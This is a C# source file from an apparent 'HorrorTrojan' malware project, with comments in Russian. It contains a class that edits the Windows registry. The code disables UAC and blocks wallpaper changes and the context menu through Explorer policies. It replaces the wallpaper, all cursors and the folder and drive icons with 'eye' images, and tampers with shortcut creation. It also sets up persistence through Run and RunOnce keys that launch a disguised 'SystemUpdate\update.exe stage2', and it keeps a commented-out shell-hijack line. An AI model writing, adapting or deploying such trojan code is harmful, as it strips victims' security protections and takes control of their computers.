using Microsoft.Win32;

namespace HorrorTrojan
{
    internal static class RegistryLocker
    {
        public static void LockEverything()
        {
            // ===== ОТКЛЮЧЕНИЕ UAC =====
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
            }
            
            // ===== ЗАПРЕТ ИЗМЕНЕНИЙ В ПРОВОДНИКЕ =====
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
            {
                key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                key.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
            }
            
            // ===== УСТАНОВКА ОБОЕВ =====
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
            {
                key.SetValue("Wallpaper", @"C:\Windows\ProgramFiles\SystemUpdate\wallpaper.jpg", RegistryValueKind.String);
                key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
            }
            
            // ===== УСТАНОВКА КУРСОРА =====
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
            {
                key.SetValue("SchemeSource", 1, RegistryValueKind.DWord);
                key.SetValue("Arrow", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("Help", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("AppStarting", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("Wait", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("Crosshair", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("IBeam", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("NWPen", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("No", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("SizeNS", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("SizeWE", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("SizeNWSE", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("SizeNESW", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("SizeAll", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
                key.SetValue("UpArrow", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
            }
            
            // ===== БЛОКИРОВКА ЯРЛЫКОВ =====
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"\.lnk\ShellNew"))
            {
                key.SetValue("Command", "", RegistryValueKind.String);
            }
            
            // ===== SHELL НЕ ТРОГАЕМ (ЧТОБЫ РАБОЧИЙ СТОЛ РАБОТАЛ) =====
            // ПОДМЕНА Shell УБРАНА!
            // key.SetValue("Shell", "explorer.exe," + @"C:\Windows\ProgramFiles\SystemUpdate\update.exe", RegistryValueKind.String);
            
            // ===== АВТОЗАГРУЗКА (через Run) =====
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
            {
                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe stage2", RegistryValueKind.String);
            }
            
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
            {
                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe stage2", RegistryValueKind.String);
            }
            
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
            {
                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe stage2", RegistryValueKind.String);
            }
            
            // ===== СМЕНА ИКОНОК =====
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"Folder\DefaultIcon"))
                key.SetValue("", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ico,0", RegistryValueKind.String);
                
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"Directory\DefaultIcon"))
                key.SetValue("", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ico,0", RegistryValueKind.String);
                
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"Drive\DefaultIcon"))
                key.SetValue("", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ico,0", RegistryValueKind.String);
        }
    }
}
